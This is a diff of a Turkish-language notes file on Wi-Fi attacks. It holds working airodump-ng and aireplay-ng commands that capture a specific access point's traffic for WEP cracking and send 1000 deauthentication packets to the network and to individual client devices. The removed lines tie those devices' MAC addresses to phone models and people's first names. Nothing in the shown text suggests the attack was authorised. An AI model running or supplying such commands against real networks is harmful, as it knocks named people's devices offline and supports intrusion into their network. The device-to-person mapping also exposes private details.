@@ -24,11 +24,7 @@ airodump-ng --bssid 88:41:FC:19:B4:5B --channel 1 --write wepcrack wlan0mon
 aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B wlan0mon
 
  Belli bir cihazı yetkisizlendirmek;
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon	[OPPO R4L, Turgay]
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 06:E9:84:18:81:A3 wlan0mon	[OPPO R4L, Talha ]
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 88:AE:07:94:6E:94 wlan0mon	[IPHONE 6, Eşref ]
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c F0:8A:76:70:B6:36 wlan0mon	[SG-A10  , Ayfer ]
-
+aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon	[OPPO R4L, T]
  --deauth = atılacak paket sayısı
  -a = bssid
  -c = saldırılmak istenen cihaz
